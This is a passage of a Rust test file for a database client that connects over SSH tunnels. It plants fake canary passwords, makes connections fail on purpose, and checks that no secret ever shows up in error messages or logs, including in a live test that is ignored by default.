        let h = Harness::new();
        let (db, ssh, ssh2) = ("db-canary-7c1", "ssh-canary-4e9", "ssh-canary-b02");
        let mut errors = Vec::new();
        h.add(
            "canary",
            &format!("postgres://app:{db}@db.internal:5432/main"),
            &json!({"ssh": {"host": "127.0.0.1", "port": 1, "user": "u", "auth": "password", "secret": ssh}}).to_string(),
        )
        .unwrap();
        errors.push(h.detail("canary"));
        errors.extend(h.test_saved("canary").err());
        errors.extend(h.block(h.inner().open_profile("canary")).err());
        h.update(
            "canary",
            &json!({"ssh": {"host": "127.0.0.1", "port": 1, "user": "u", "auth": "password", "secret": ssh2}}).to_string(),
        )
        .unwrap();
        errors.extend(h.test_saved("canary").err());
        assert!(
            errors.iter().any(|e| e.contains("127.0.0.1:1")),
            "the dial should have failed and said where: {errors:?}"
        );
        assert_never_logged(&[db, ssh, ssh2], &errors);
    }

    #[test]
    #[ignore = "needs a real sshd in front of postgres; see live()"]
    fn live_no_secret_is_logged_through_a_real_handshake() {
        captured_log();
        let h = Harness::new();
        h.add(
            "pg",
            &live("DB_URL"),
            &live_ssh("password", Some(live("PASSWORD"))),
        )
        .unwrap();
        h.trust_reviewed();
        assert_eq!(h.test_saved("pg").unwrap()["product"], "PostgreSQL");
        h.select_one("pg");
        let db_password = live("DB_URL")
            .split_once("://")
            .and_then(|(_, rest)| rest.split_once('@'))
            .and_then(|(userinfo, _)| userinfo.split_once(':'))
            .map(|(_, pw)| pw.to_string())
            .expect("DB_URL carries a password");
        assert_never_logged(&[&live("PASSWORD"), &db_password], &[]);
    }
}
